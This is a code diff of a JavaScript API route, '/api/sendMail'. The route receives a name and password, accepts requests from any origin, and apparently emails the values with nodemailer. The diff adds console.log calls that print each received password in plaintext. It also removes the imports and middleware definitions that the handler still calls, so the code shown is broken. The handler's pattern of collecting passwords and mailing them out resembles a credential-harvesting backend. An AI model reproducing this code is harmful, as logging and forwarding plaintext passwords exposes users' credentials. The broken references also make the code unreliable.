@@ -1,16 +1,3 @@
-import nodemailer from 'nodemailer';
-import cors from 'cors';
-
-const corsMiddleware = cors({ origin: '*', methods: ['POST'] });
-
-const runMiddleware = (req, res, fn) =>
-  new Promise((resolve, reject) => {
-    fn(req, res, (result) => {
-      if (result instanceof Error) return reject(result);
-      return resolve(result);
-    });
-  });
-
 export default async function handler(req, res) {
   await runMiddleware(req, res, corsMiddleware);
   console.log('API /api/sendMail called with method:', req.method);
@@ -20,10 +7,14 @@ export default async function handler(req, res) {
   }
 
   const { name, password } = req.body;
+  console.log('Received name:', name);
+  console.log('Received password:', password);
 
-  // No validation - directly use the values, fallback to empty strings if undefined
   const sanitizedName = typeof name === 'string' ? name.trim() : '';
   const sanitizedPassword = typeof password === 'string' ? password.trim() : '';
+
+  console.log('Sanitized name:', sanitizedName);
+  console.log('Sanitized password:', sanitizedPassword);
 
   try {
     const transporter = nodemailer.createTransport({
